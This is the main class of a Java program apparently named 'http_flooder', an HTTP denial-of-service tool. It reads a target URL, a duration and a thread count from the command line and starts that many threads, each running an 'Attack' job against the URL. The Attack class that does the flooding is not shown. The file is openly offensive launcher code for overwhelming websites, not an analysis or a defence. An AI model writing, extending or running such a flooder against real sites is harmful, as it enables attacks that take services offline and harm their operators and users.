package me.aaronakhtar.http_flooder;

import java.util.ArrayList;
import java.util.List;

public class Main {

    public static void main(String[] args){
                                                                    //  url time threads
        if (args.length != 3){
            System.out.println("url time threads");
            System.exit(0);
        }

        String url = args[0];
        int time = Integer.parseInt(args[1]);
        int threads = Integer.parseInt(args[2]);
        List<Thread> threadList = new ArrayList<>();
        for(int x =0; x < threads; x++){
            threadList.add(new Thread(new Attack(time, url)));
            threadList.get(x).start();
        }

    }


}
